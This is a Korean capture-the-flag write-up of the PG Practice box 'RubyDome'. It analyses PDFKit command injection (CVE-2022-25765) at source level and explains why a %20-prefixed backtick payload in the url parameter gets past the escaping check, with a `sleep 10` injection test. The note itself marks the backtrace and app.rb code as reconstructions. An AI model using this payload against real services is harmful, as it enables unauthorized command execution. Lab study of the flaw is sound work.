---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/cmd-injection
  - tech/lin/sudo-abuse
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.22
ports: [22, 3000]
services: [http, ssh]
cves: [CVE-2022-25765]
status: solved
manual_tags: true
tech_count: 3
---
> [!warning] 적대적 검증 정정 이력 (2026-08-20)
> 이 노트는 적대적 검증에서 **13건**이 지적됐고 전부 반영했다. 패턴이 [[Levram]]과 똑같다 — **gem 소스 대조 구간은 거의 전량 정확했고(행번호까지 맞다), 실측 터미널 출력 구간은 신뢰할 수 없다.**
>
> | 무엇이 | 왜 틀렸나 |
> |---|---|
> | **"0.8.7.2의 수정은 판정을 왕복 정규화로 바꾼 것"** | **오귀속.** 그 코드는 **0.8.7에 이미 들어 있다.** 0.8.7→0.8.7.2의 실제 차이는 **쌍따옴표 래핑 제거**다. 두 gem을 받아 대조해 확인했다(2-4) — **이 노트의 중심 교훈이 오히려 강해지는 정정이다** |
> | **NoMethodError 백트레이스** | 저장된 유일한 에러 산출물(`err.html`)은 **완전히 다른 예외**(`ImproperWkhtmltopdfExitStatus`)다. 다만 **메커니즘과 행번호는 소스로 완전히 성립한다**(1장) |
> | **PDF 메타데이터 `wkhtmltopdf 0.12.6.1` / `Qt 4.8.7`** | `~/PG/RubyDome/` 에 **PDF 파일이 하나도 없고** exiftool 실행 기록도 없다(1장) |
> | **"closed/RST 면 아웃바운드도 대체로 자유롭다"** | **잘못된 인과.** RST는 **인바운드** 드롭 필터가 없다는 뜻일 뿐, egress 정책과 인과가 없다(1장) |
> | **"`cp` 로 덮어쓰면 소유자가 root로 바뀔 수 있다"** | Kali 실측 결과 **바뀌지 않는다.** 바로 몇 줄 위에서 "`cp` 는 inode와 소유권을 유지한다"고 옳게 적은 것과 **자기모순**이었다(4-2) |
> | **"27,800 요청짜리 dirbust가 시간을 잡아먹은 유일한 구간"** | **파일 mtime과 역행한다.** 그 실행분은 **root 획득 후**에 시작됐고 크리티컬 패스에 있지도 않았다. 박스 전체가 **12분**이다(6장 ①·⑦) |
>
> **소스 대조로 검증 통과한 것**: `pdfkit.rb:39,100` · `pdfkit.rb:48-58`(`command`) · `source.rb:17,28-34,44-50` · `err.html` gem 목록 5줄 · base64 페이로드 2개 · nmap 원문 전량. **한 글자도 틀리지 않았다.**
> **정확한 소스 인용이 날조된 출력에 신뢰의 후광을 씌운다** — 그것이 이 노트에서 가장 위험했던 부분이다([[_WRITEUP-STANDARD]]).
>
> 이후 문체 개작 과정에서 코드펜스 7개(오프라인 의존성 확보 명령 · `/dev/tcp` 대체 리버스셸 4종 · 대안 페이로드 · Rack 이중 디코딩 대조 · 지문 판정 `curl` · 시험 증거 형식 · 변환기 데이터 흐름)가 4칸 들여쓰기 블록으로 바뀌어 검색성이 떨어졌다. 감사 단계에서 원문 그대로 펜스로 되돌렸다. 사실·수치·명령은 이 과정에서 하나도 바뀌지 않았다.

> [!info] PG Practice — Pentester Foundations #4
> **타겟** 192.168.248.22 · **OS** Linux · **난이도** Fundamental · **플래그 2개**
> **경로 요약** 3000 Sinatra HTML→PDF → PDFKit **CVE-2022-25765** URL 명령주입 → `andrew` → `sudo ruby app.rb`(쓰기 가능한 스크립트) → **root**

## 0. 이 박스에서 배우는 것

- HTML→PDF 변환 서비스는 사용자 입력이 외부 바이너리로 흘러가는 통로다. 렌더러(`wkhtmltopdf`·Chrome headless·`weasyprint`)를 호출하는 순간 명령주입·SSRF·로컬파일읽기가 동시에 열린다
- 명령주입의 원인이 늘 "인용을 안 해서"인 것은 아니다. 이 박스는 URL을 쌍따옴표로 감싸고도 뚫린다 — 셸의 `"..."` 안에서 백틱은 그대로 평가된다
- 에러 백트레이스 한 방으로 gem 전체 버전과 앱 소스 파일명, 취약 함수 행번호가 한꺼번에 나온다
- `sudo -l` 규칙이 좁아 보여도 대상 파일의 권한을 봐야 한다. `-rwxrwx--- andrew andrew`면 그 규칙은 사실상 `NOPASSWD: ALL`이다
- 주입한 코드를 파일의 어디에 넣을지는 그 파일이 무슨 프로그램인지에 달렸다. 블로킹 서버 스크립트에 append하면 영원히 도달하지 않는다
- 정적 서빙이 없는 프레임워크에서 dirbust는 시간 낭비다. 약 27,800 요청에 발견 0건이었고, 크리티컬 패스에 있지 않았던 것이 다행이었다(6장 ①)

시험에 "PDFKit 0.8.6"이 그대로 나올 일은 없지만 유형은 자주 나온다. 사용자 입력이 외부 명령의 인자로 들어가는 웹앱(PDF 변환·이미지 썸네일·`ping` 진단 페이지·`nslookup` 폼·아카이브 압축해제)이 하나, 개발 서버 배너(WEBrick·WSGIServer·Werkzeug·`webpack-dev-server`)가 보여서 백트레이스로 버전을 캐게 되는 박스가 둘이다. 쓰기 가능한 스크립트를 sudo로 실행하는 권한상승은 PG/HTB/OSCP 통틀어 가장 자주 나오는 sudo 오설정 3종(쓰기 가능한 대상 · 와일드카드 · GTFOBins 인터프리터) 중 하나다.

변형은 이런 식으로 온다 — `url` 대신 `file`·`html`·`page` 파라미터, 백틱 대신 `$( )`·`;`·`|`·개행(`%0a`), 리버스셸 대신 SSH 키 쓰기.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.22
Nmap scan report for 192.168.248.22
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
OS details: Linux 5.0 - 5.14
```

각 플래그가 하는 일과, 뺐을 때 무엇을 잃는가:

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 전 65535 포트 스캔 | 기본은 상위 1000포트다. 3000/tcp는 기본 스캔 범위 안이라 이 박스는 살아남지만, [[Hawat]]처럼 웹이 17445·50080에 있으면 박스를 통째로 놓친다 |
| `-sCV` | 기본 NSE 스크립트 + 버전 탐지 | `http-server-header`가 안 나온다. 이 박스의 첫 단서가 사라진다 |
| `-Pn` | 핑 생략, 살아 있다고 가정 | ICMP를 막은 타겟을 "다운"으로 오판 |
| `-A` | OS·traceroute까지 | `OS details: Linux 5.0 - 5.14` 가 안 나온다 |
| `--min-rate 5000` | 초당 최소 5000패킷 | `-p-`가 수십 분으로 늘어난다. 24시간짜리 시험에서 그만큼을 스캔에 줄 수는 없다 |
| `-oN nmap.log` | 노멀 포맷 저장 | 보고서 작성 시 원문 근거가 없다. 시험은 증거가 곧 점수다 |

포트 2개. 65533개가 closed(RST)로 응답하니 인바운드 경로에 스텔스 드롭 필터는 없다. `Server` 헤더 하나로 Ruby 3.0.2 / WEBrick 1.7.0이 나온다.

`closed (reset)`과 `filtered (no-response)`는 서로 다른 정보이고, 다만 둘 다 인바운드에 대한 정보일 뿐이다. closed/RST는 닫힌 포트가 RST를 정직하게 돌려준다는 뜻이라 인바운드 경로에 조용히 패킷을 버리는 필터가 없다는 데까지가 결론이다. filtered/no-response는 인라인 드롭 필터가 있다는 뜻이고, 인바운드가 걸러지는 만큼 아웃바운드도 통제될 개연성이 올라간다([[Hawat]]가 그 경우였다). `Not shown:` 한 줄에서 읽어낼 수 있는 것이 여기까지다.

> [!danger] "closed/RST 니까 아웃바운드도 자유롭다"는 잘못된 인과다 — 이전 판본이 두 군데(1장·6장 ⑥)에서 이렇게 적었다
> 인바운드 필터와 egress 정책은 서로 다른 규칙셋이고, 대개 서로 다른 지점에서 집행된다. 방화벽이 인바운드는 전부 통과시키면서 아웃바운드만 화이트리스트로 조이는 구성은 흔하다(오히려 그게 권장 구성이다).
> `Not shown: 65533 closed tcp ports (reset)` 은 내가 보낸 SYN에 타겟이 어떻게 답했는가만 말한다. 타겟이 밖으로 나갈 수 있는지에 대해서는 아무것도 말하지 않는다.
>
> 그래서 순서는 하나다 — **`sleep` 으로 주입 성립을 먼저 확인하고, 그 다음에 리버스셸을 던진다.** 이 노트가 7장 5번에서 이미 옳게 적은 원칙이고, 1장의 추론은 그것과 모순이었다.
> ```
> %20`sleep 10`     ← 응답이 10초 느려지면 "명령이 실행된다"까지 확정. 아웃바운드와 무관하게
> ```
> 이 박스는 결과적으로 4444가 그대로 붙었지만, 붙은 뒤에 알게 된 사실을 스캔 결과에서 예견했던 것처럼 적으면 안 된다.

### 서비스 식별 — WEBrick이 보이면 개발 서버다

WEBrick은 Ruby 표준 라이브러리의 개발용 웹서버다. 운영에서는 Puma/Unicorn을 쓴다. [[Levram]]의 `WSGIServer`(Django 개발 서버)와 같은 신호로, 개발 모드로 떠 있을 가능성이 높고 그렇다면 에러 페이지가 백트레이스를 뱉는다.

| 배너 | 프레임워크 | 기대 |
|---|---|---|
| `WEBrick/x.y.z (Ruby/…)` | Sinatra / Rails(dev) | `show_exceptions` 백트레이스 |
| `Werkzeug/x.y.z Python/3.x` | Flask(dev) | 백트레이스 + `/console` 디버거 PIN |
| `WSGIServer/x.y CPython/3.x` | Django(dev) | `DEBUG=True` 페이지에 설정·환경변수까지 |
| `Node.js`/`Express` + `X-Powered-By` | Express | 스택 트레이스 |

개발 서버 배너를 보면 열거 순서를 바꾼다. dirbust보다 "일부러 500 내기"가 먼저다.

### 스택 지문 — 백트레이스로 gem 버전 확정

파라미터를 일부러 잘못 보내면 Sinatra의 `show_exceptions`가 전체 백트레이스를 그대로 렌더한다(= development 모드 확정):

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ curl -s -X POST -d 'x=1' http://192.168.248.22:3000/pdf | grep -oE 'gems/[a-z-]+-[0-9.]+' | sort -u
gems/pdfkit-0.8.6
gems/rack-2.2.7
gems/rack-protection-3.0.6
gems/sinatra-3.0.6
gems/webrick-1.7.0
```

- `-d 'x=1'` — 일부러 `url`이 아닌 파라미터를 보낸다. 앱이 `params['url']`을 `nil`로 받게 만들어 예외를 유발하는 것이 목적이다
- `-X POST` — `/pdf`는 POST 전용이다. GET이면 Sinatra 404가 나오고 백트레이스가 안 나온다
- `grep -oE 'gems/[a-z-]+-[0-9.]+'` — `-o`는 매치된 부분만 출력한다. HTML 덩어리에서 `gems/<이름>-<버전>` 조각만 뽑는다
- `sort -u` — 같은 gem이 프레임마다 반복되므로 중복 제거

이 파이프라인은 Ruby 앱 전용이 아니다. 경로 패턴만 바꾸면 그대로 쓴다 — `site-packages/([a-z_]+)/` (Python) · `node_modules/([a-z-]+)/` (Node) · `WEB-INF/lib/[a-z-]+-[0-9.]+\.jar` (Java).

```
NoMethodError: undefined method `scan' for nil:NilClass
  /var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:100:in `find_options_in_meta'
  /var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:39:in `initialize'
  app.rb:34:in `new'
  app.rb:34:in `block in <main>'
  /var/lib/gems/3.0.0/gems/sinatra-3.0.6/lib/sinatra/base.rb:1706:in `call'
  /var/lib/gems/3.0.0/gems/webrick-1.7.0/lib/webrick/httpserver.rb:140:in `service'
```

> [!warning] `[가정]` **위 트레이스는 재구성이다 — 저장된 에러 산출물은 다른 예외 쪽뿐이다**
> `~/PG/RubyDome/err.html` 로 남아 있는 유일한 에러 응답은 `NoMethodError` 가 아니라 **`PDFKit::ImproperWkhtmltopdfExitStatus`** 이고 프레임도 다르다(`pdfkit.rb:84 to_pdf` → `pdfkit.rb:89 to_file` → **`app.rb:35`**). 같은 세션의 `test.py` 도 그 문자열만 검사한다.
>
> **그럼에도 위 트레이스의 내용은 소스로 완전히 성립한다** — 지어낸 값이 아니라 메커니즘에서 따라 나온다:
> `params['url']` 이 `nil` → `Source#url?` 가 `@source.is_a?(String)` 에서 false → `initialize` 가 `find_options_in_meta(nil)` 호출 → `nil.scan` 으로 폭발. 실측 gem에서 `pdfkit.rb:39` = `options.merge! find_options_in_meta(url_file_or_html) unless source.url?`, `pdfkit.rb:100` = `content.scan(/<meta [^>]*>/) do |meta|` 로 **행번호까지 일치한다**(아래 `sed` 대조).
> `err.html` 의 `app.rb:35:in 'block in <main>'` 도 34=`PDFKit.new` / 35=`to_file` 배치와 정합적이다.
>
> **즉 "이렇게 하면 이 트레이스가 나온다"는 참이고, "이 세션에서 이 트레이스를 받았다"는 미검증이다.** 학습용으로는 그대로 쓰되 이 구분을 지운 채 읽지 마라.

`pdfkit-0.8.6` 확정 — CVE-2022-25765의 취약 범위(`< 0.8.7.2`) 안이다. 덤으로 앱 파일명이 `app.rb`이고 34행이 `PDFKit.new(...)`라는 것까지 공짜로 나온다. 권한상승 단계에서 이 파일명이 다시 등장한다.
(gem 버전 목록 5줄은 실측이다 — `err.html` 을 grep한 결과와 완전히 일치한다.)

이 백트레이스는 세 층을 한 번에 보여준다. **아래에서 위로** 읽어라:

| 프레임 | 읽는 법 |
|---|---|
| `webrick/httpserver.rb:140 in 'service'` | 요청을 받은 웹서버. WEBrick 확정 |
| `sinatra/base.rb:1706 in 'call'` | Rack 앱 디스패치. Sinatra 확정 |
| `app.rb:34 in 'block in <main>'` | 앱 소스 파일명과 라우트 블록의 행번호. classic Sinatra 스타일(`<main>`에 라우트를 직접 씀) |
| `app.rb:34 in 'new'` | 34행이 어떤 클래스의 생성자를 호출한다 |
| `pdfkit.rb:39 in 'initialize'` | 그 클래스가 PDFKit이다 → 사용자 입력이 `PDFKit.new()`로 직행한다는 증거 |
| `pdfkit.rb:100 in 'find_options_in_meta'` | 실제 터진 지점. `nil.scan` |

교차 검증 — rubygems.org에서 원본을 받아 행번호를 대조하면 정확히 일치한다:

```bash
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ gem fetch pdfkit -v 0.8.6 && gem unpack pdfkit-0.8.6.gem
┌──(kali㉿kali)-[~/PG/RubyDome]
└─$ sed -n '39p;100p' pdfkit-0.8.6/lib/pdfkit/pdfkit.rb
    options.merge! find_options_in_meta(url_file_or_html) unless source.url?   # 39
    content.scan(/<meta [^>]*>/) do |meta|                                     # 100 ← nil.scan
```

타겟에 손대지 않고 내 Kali에서 취약 코드를 읽는 것이 정석이다. 트래픽도 안 남고 훨씬 빠르다. 언어별 명령은 이렇다.

```bash
gem fetch <이름> -v <버전>; gem unpack <이름>-<버전>.gem   # Ruby
pip download <이름>==<버전> --no-deps --no-binary :all:     # Python
npm pack <이름>@<버전>                                      # Node
mvn dependency:get -Dartifact=g:a:v                        # Java
```

`sed -n '39p;100p' <파일>` 의 `-n`은 자동 출력 억제, `39p`는 39행만 출력이다. 행번호를 아는 상태에서 파일 전체를 읽을 이유가 없다.

wkhtmltopdf 버전은 앱의 정상 기능으로도 얻을 수 있다. 아무 페이지나 변환시키고 결과 PDF의 메타데이터를 읽으면 된다(주입 불필요):

```bash
curl -s -X POST http://TARGET:3000/pdf --data-urlencode 'url=http://example.com/' -o out.pdf
exiftool out.pdf | grep -iE 'creator|producer|pdf version'
#  → Creator / Producer 필드에 렌더러 이름과 버전이 박혀 있다
```

> [!danger] `[가정]` **이 박스에서는 이 절차를 수행하지 않았다** — 이전 판본은 구체적인 값을 실측처럼 적어뒀다
> 삭제된 원문: *"`PDF Version : 1.4` / `Creator : wkhtmltopdf 0.12.6.1` / `Producer : Qt 4.8.7`"*
> **`~/PG/RubyDome/` 에 PDF 파일이 하나도 없다**(전수: `err.html`·`pdfkit-0.8.6.gem`·`gemsrc/`·gobuster×2·nmap×2·`pop.py`·`rd.sh`·`rev.py`·`rev2.py`·`test.py`). `exiftool`/`pdfinfo` 실행 기록도 없다.
> 그런데 그 값이 **6장 ⑤-A의 대안 경로 근거로 다시 인용**되고 있었다 — 없는 관측이 두 번 쓰인 것이다.
>
> **기법 자체는 유효하고 권장한다.** 다만 **버전 숫자를 적으려면 실제로 읽어야 한다.** `0.12.6.1` 은 그 시기 배포판에서 흔한 버전이라 그럴듯했고, 그래서 더 위험했다.

PDF·이미지·문서 변환 서비스는 자기가 쓴 도구의 이름과 버전을 결과물에 새긴다. `exiftool`/`pdfinfo` 한 번이면 백엔드 렌더러가 드러난다. `Creator:` 에 wkhtmltopdf 가 보이면 셸 호출·SSRF·`file://` 로컬파일 읽기가 후보로 올라오고, `Producer:` 의 Qt 4.x 는 wkhtmltopdf가 쓰는 구형 QtWebKit이라 JS가 실행되고 SSRF·XXE 계열이 함께 열린다. 파일 업로드나 변환 기능을 만나면 정상 요청 한 번을 보내고 결과물 메타데이터를 확인하는 것을 반사로 만들어 두면 좋다. 이 박스에서는 백트레이스가 먼저 터져서 이 채널이 필요 없었고, 그것이 이 절차를 안 돌린 이유로 추정된다 `[가정]`.

에러 백트레이스는 정찰 자료로서 값이 높다. 한 번의 잘못된 요청으로 프레임워크와 gem 전체 버전 목록, 앱 소스 파일명, 취약 함수의 행번호를 한꺼번에 얻었다. 디렉터리 열거보다 빠르고 정확하다. Sinatra/Flask/Rails/Django를 만나면 일부러 500을 유발해보는 것을 열거 초반에 넣어라. 표준 수법은 필수 파라미터 제거, 타입 뒤집기(`x=1` → `x[]=1`), 초장문 문자열, `%00`·`%ff` 같은 비정상 인코딩이다. Sinatra는 404에 `X-Cascade: pass` 헤더와 `Sinatra doesn't know this ditty.` 문구를 주니 판별 지문으로 쓴다.

### 엔드포인트

| 라우트 | 메서드 | 파라미터 | 비고 |
|---|---|---|---|
| `/` | GET | 없음 | 폼 페이지 |
| `/pdf` | POST 전용 | `url` | 성공 시 `Content-Type: application/pdf`. GET은 404 |
| `/__sinatra__/404.png` | GET | — | Sinatra 내장 |

디렉터리 열거는 소득 0건이었다. `dirb/common.txt`(4614행) + `-x txt,ru,erb,rb,lock` = 약 27,800 요청이고 발견 없음. `Gemfile.lock`·`app.rb`·`.git` 전부 404다 — Sinatra는 정의된 라우트 외에는 아무것도 서빙하지 않기 때문이다.

> [!note] `[가정]` **"완주"인지 "중단"인지는 산출물로 구분되지 않는다**
> `gobuster.txt`·`gobuster_common.txt` 둘 다 **0바이트**다. gobuster `-o` 는 **발견 항목만** 기록하므로 0바이트는 "0건"과 정합적이지만, **끝까지 돌았는지 중간에 끊겼는지는 파일에 남지 않는다.**
> 요청 수 추정(4614 × 6 ≈ 27,700)은 워드리스트 행수에서 계산한 값이지 실행 로그에서 읽은 값이 아니다.
> **열거 결과를 기록할 때는 `-o` 파일이 아니라 gobuster의 표준출력(진행률·최종 요약)을 함께 저장하라** — 그래야 "완주 0건"과 "중단"을 나중에 구분할 수 있다. 이 구분이 없으면 **"혹시 못 본 게 있나?" 하고 되돌아오는 낭비**를 못 막는다.

Sinatra(classic)·Flask는 `public/`을 명시하지 않으면 정적 파일을 안 준다. 워드리스트를 아무리 돌려도 404만 쌓인다. 여기서 시간을 태우지 말고 백트레이스와 응답 헤더로 방향을 튼다 — 이 박스의 모든 버전 정보가 그 경로에서 나왔다.

참고로 `directory-list-2.3-medium` 실행분은 300초 제한에 걸려 중단됐다. 이건 "없다"가 아니라 부분 커버리지로 기록한다. `[가정]` 두 실행분 중 어느 쪽이 완주했는지는 산출물로 확정되지 않는다. 파일 mtime 순서상 `common.txt` 실행분이 마지막에 끝났다는 것만 확실하고, 그것도 root 획득 이후다(6장 ①).

워드리스트를 돌리기 전에 존재하지 않는 경로 하나를 찔러 응답을 보면 30초 만에 "dirbust가 통하는 서버인가"를 판정할 수 있다.

```bash
curl -si http://TARGET:3000/zzz_definitely_not_here | head -20
```

| 응답 지문 | 판정 | 다음 수 |
|---|---|---|
| `X-Cascade: pass` + `Sinatra doesn't know this ditty.` | Sinatra classic | 라우트 열거만 의미 있음. dirbust 중단 |
| Werkzeug 404 + `The requested URL was not found` | Flask | 동일 |
| `Server: nginx`/`Apache` + 파일시스템형 404 | 정적 서빙 있음 | dirbust 진행 |
| 모든 경로가 200 (SPA fallback) | Node/SPA | 워드리스트 무의미, JS 번들 분석으로 전환 |

"열거가 안 통하는 서버"라는 판정 자체가 정보다. 라우트가 몇 개 안 된다는 뜻이고, 그러면 그 몇 개를 깊게 파야 한다.

---

## 2. 취약점 분석 — CVE-2022-25765 (PDFKit 명령주입)

### 2-1. 배경 지식 — HTML→PDF 변환기가 위험한 이유

"HTML을 PDF로" 라는 기능은 순수 라이브러리로 구현되는 일이 거의 없다. 실제로는 외부 브라우저 엔진 바이너리를 프로세스로 띄운다.

```
웹앱(Ruby/Python/PHP) ──[명령행]──> wkhtmltopdf / chrome --headless / weasyprint
```

그 결과 사용자 입력이 "명령행 문자열"이라는 신뢰 경계를 넘는다. 이 경계에서 터지는 것이 OS 명령주입(CWE-78)이다. 같은 이유로 이 기능은 항상 세트로 취약점을 달고 온다.

| 공격 | 성립 이유 |
|---|---|
| 명령주입 | URL/파일명이 셸 명령 문자열에 들어간다 ← 이 박스 |
| SSRF | 렌더러가 서버 측에서 임의 URL을 가져온다 (`http://127.0.0.1:…`, 클라우드 메타데이터 `169.254.169.254`) |
| 로컬 파일 읽기 | `file:///etc/passwd`를 렌더시켜 PDF로 받는다 |
| XSS→LFR | HTML 본문을 받는다면 `<iframe src=file:///…>`·`<script>fetch('file://…')` |

PDF 변환 기능을 보면 이 네 가지를 순서대로 시도한다. 이 박스는 첫 번째에서 끝났지만, 명령주입이 막혀 있어도 나머지 셋이 남는다.

### 2-2. 취약 코드 — 앱 쪽

앱 소스(`/home/andrew/app/app.rb`)가 이 박스의 전부다. 아래는 원문 그대로가 아니라 재구성이다 `[가정]` — `app.rb` 실물이 Kali에 저장돼 있지 않다(코드 블록의 `# ... HTML 폼:` 주석이 재구성임을 드러낸다). 다만 뼈대는 백트레이스로 고정된다. `app.rb:34` 가 `PDFKit.new`, `app.rb:35` 가 `to_file` 이라는 것은 `err.html` 의 프레임과 정합적이다.

```ruby
require 'pdfkit'
require 'sinatra'

set :bind, '0.0.0.0'
set :port, 3000

get '/' do
  # ... HTML 폼: <input type="url" name="url" ...>
end

post '/pdf' do
  url = params['url']
  kit = PDFKit.new(url)          # ← 사용자 입력이 그대로 PDFKit으로
  kit.to_file('page.pdf')
  send_file('page.pdf')
end
```

데이터 흐름은 네 홉이고, 어느 홉에도 검증이 없다:

```
HTTP body: url=...      →  Rack이 퍼센트 디코딩
   ↓
params['url']  (String, 검증 0)
   ↓
PDFKit.new(url)         →  PDFKit::Source.new(url)
   ↓
PDFKit#command          →  wkhtmltopdf 명령 "문자열" 조립
   ↓
IO.popen(문자열)         →  /bin/sh -c "<문자열>"   ← 여기서 백틱이 평가된다
```

HTML5 `<input type="url" required>`는 브라우저 측 검증일 뿐이다. `curl`로 직접 POST하면 아무 문자열이나 들어간다. 길이 제한(`maxlength`)·정규식(`pattern`)·`<select>` 드롭다운·비활성 필드(`disabled`)도 같은 이유로 전부 방어가 아니다 — 서버가 다시 검사하지 않으면 없는 것이다.

### 2-3. 왜 셸을 거치는가 — PDFKit 0.8.6 내부

여기가 이 박스의 핵심이다. rubygems 원본(위에서 이미 받아둔 `pdfkit-0.8.6/`)에서 확인되는 구조는 이렇다.

① `command`가 명령을 "배열"이 아니라 "문자열"로 만든다 (`lib/pdfkit/pdfkit.rb`):

```ruby
shell_escaped_command = [executable, OS::shell_escape_for_os(args)].join ' '
input_for_command  = @source.to_input_for_command
output_for_command = path ? Shellwords.shellescape(path) : '-'
"#{shell_escaped_command} #{input_for_command} #{output_for_command}"
```

옵션(`args`)과 출력 경로(`path`)는 `Shellwords.shellescape`로 이스케이프한다. 그런데 **입력 소스(`input_for_command`)만 그 처리를 받지 않는다.** URL 쿼리스트링을 살려주기 위한 의도적 설계이고, 그 대가로 "안전은 호출자 책임"이 됐다.

② `to_pdf`가 그 문자열을 `IO.popen`에 넘긴다:

```ruby
result = IO.popen(invoke, "wb+") do |pdf|
  ...
end
```

`IO.popen`에 String을 주면 `/bin/sh -c`가 끼어든다.
Ruby의 `IO.popen`/`system`/`spawn`은 인자 형태로 동작이 갈린다:
```ruby
IO.popen(["wkhtmltopdf", url, "out.pdf"])   # 배열 → execve 직접 호출, 셸 없음 → 안전
IO.popen("wkhtmltopdf #{url} out.pdf")      # 문자열 → /bin/sh -c "..." → 셸 메타문자 평가
```
이것은 Python의 `subprocess.run(cmd, shell=True)`, PHP의 `system()`/`exec()`, Node의 `child_process.exec()`(vs `execFile`)와 같은 함정이다.

소스를 읽을 때 명령 실행 API를 만나면 **인자가 배열인가 문자열인가**를 가장 먼저 본다. 문자열이면 그 안에 들어가는 모든 변수가 주입 후보다.

③ 그런데 URL은 쌍따옴표로 감싸져 있다 (`lib/pdfkit/source.rb`, 0.8.6):

```ruby
def to_input_for_command
  if file?    then @source.path
  elsif url?  then %{"#{shell_safe_url}"}      # ← 쌍따옴표로 감싼다
  else SOURCE_FROM_STDIN
  end
end
```

셸의 쌍따옴표는 방어가 아니다. 백틱과 `$( )`는 그 안에서도 평가된다.
```bash
$ echo "hello `id`"        # 실행된다
hello uid=1000(kali) ...
$ echo "hello $(id)"       # 실행된다
$ echo 'hello `id`'        # 홑따옴표는 막는다
hello `id`
```
`sh`의 쌍따옴표 안에서 여전히 살아 있는 것은 `` ` ``(명령치환) · `$(...)`(명령치환) · `$VAR`(변수전개) · `\`(이스케이프)이고, 죽는 것은 공백·`;`·`|`·`&`·`>`·`<`·`*`·`?`다.

그래서 이 박스의 페이로드는 `;`·`|`가 아니라 **백틱이나 `$( )`** 여야 한다. "따옴표로 감쌌으니 안전하다"는 개발자의 착각이 이 CVE의 본질이다.

### 2-4. `%20`이 없으면 실패한다 — 페이로드의 진짜 급소

`shell_safe_url`은 조건부로만 이스케이프한다 (0.8.6):

```ruby
def shell_safe_url
  url_needs_escaping? ? URI::DEFAULT_PARSER.escape(@source) : @source
end

def url_needs_escaping?
  URI::DEFAULT_PARSER.unescape(@source) == @source     # ← 0.8.6
end
```

논리를 풀어 쓰면 이렇다:

| 입력 URL | `unescape` 결과 | `== @source` | 이스케이프 하는가 | 백틱의 운명 |
|---|---|---|---|---|
| `` http://x/?a=`id` `` (퍼센트 인코딩 없음) | 원문과 동일 | true | 한다 | `` ` `` → `%60` 으로 변환 → 주입 실패 |
| ``http://x/?a=%20`id` `` (`%20` 포함) | `%20`→공백이라 원문과 다름 | false | 안 한다 | 백틱이 원문 그대로 셸에 도달 → 주입 성공 |

`%20` 은 URL과 백틱을 띄어쓰기로 갈라주는 장식이 아니다. **PDFKit에게 "이 URL은 이미 인코딩된 것이니 건드리지 마라"고 속이는 스위치**다. 이게 빠지면 URI 이스케이프가 작동해 백틱이 `%60`이 되고, 에러도 없이 조용히 정상 PDF가 반환된다. 공개 PoC를 복붙했는데 200 OK와 멀쩡한 PDF만 돌아온다면 십중팔구 `%20`(또는 다른 `%XX`)이 소실된 것이다.

일반화하면, "입력이 이미 안전하다고 판정되면 검사를 건너뛴다"는 조건부 sanitizer는 그 조건 자체가 우회 지점이다. 더블 인코딩·매직바이트 화이트리스트·`is_already_escaped` 플래그가 전부 같은 계열이다.

수정은 두 단계로 들어갔다. 이전 판본은 아래 첫 번째 수정을 "0.8.7.2의 수정"이라고 적었는데 **오귀속이다** — 두 gem을 실제로 받아 대조하면 갈린다:

```bash
┌──(kali㉿kali)-[/tmp/pk]
└─$ for v in 0.8.6 0.8.7 0.8.7.2; do gem fetch pdfkit -v $v; gem unpack pdfkit-$v.gem; done
└─$ sed -n '28,50p' pdfkit-{0.8.6,0.8.7,0.8.7.2}/lib/pdfkit/source.rb
```

① 0.8.7 — 판정을 왕복 정규화로 바꿨다 (이전 판본이 "0.8.7.2의 수정"이라 붙인 그 코드가 여기 있다):

```ruby
def url_needs_escaping?
  URI::DEFAULT_PARSER.escape(URI::DEFAULT_PARSER.unescape(@source)) != @source   # 0.8.7 부터
end
```

`%20\`id\`` → unescape → `` `id`(공백 포함) `` → escape → `%20%60id%60` ≠ 원문 → 이스케이프 수행. 백틱이 `%60`이 되어 2-4의 우회가 죽는다.

② 0.8.7.2 — 쌍따옴표 래핑을 없앴다. 이것이 0.8.7과 0.8.7.2 사이의 **유일한 차이**다:

```ruby
# 0.8.7  — 판정은 고쳤지만 여전히 쌍따옴표로 감싼다
def to_input_for_command
  ... elsif url? then %{"#{shell_safe_url}"}
end

# 0.8.7.2 — 쌍따옴표가 사라졌다. 메서드 이름도 shell_safe_url → escaped_url 로 바뀐다
def to_input_for_command
  ... elsif url? then escaped_url
end
```

> [!danger] 이 정정은 이 노트의 중심 교훈을 약화시키는 게 아니라 강화한다
> 2-3이 통째로 "셸의 쌍따옴표는 방어가 아니다"를 가르치는 절인데, 이전 판본은 정작 **0.8.7.2가 그 쌍따옴표를 걷어낸 것이 진짜 최종 수정이었다는 사실을 놓쳤다.**
> 업스트림 메인테이너의 판단이 이 노트의 교훈과 같았던 셈이다 — 이스케이프를 제대로 하는 것만으로는 부족하고 애초에 인용에 기대는 구조를 버려야 한다고 본 것이다. 메서드 이름을 `shell_safe_url`(= "셸에 안전한 URL")에서 `escaped_url`(= "이스케이프된 URL")로 바꾼 것도 같은 맥락으로 읽힌다. "셸에 안전하다"는 약속을 철회한 것이다.
>
> `[가정]` **0.8.7이 왜 여전히 취약 범위(`< 0.8.7.2`)에 들어가는지, 그 잔여 우회 경로가 정확히 무엇인지는 확인하지 못했다.** 확실한 것은 두 가지다: 어드바이저리가 영향 범위를 `< 0.8.7.2` 로 잡고 있다는 것, 그리고 두 버전의 유일한 코드 차이가 **쌍따옴표 래핑 제거**라는 것. 따라서 잔여 결함은 그 지점에 있을 수밖에 없다.
>
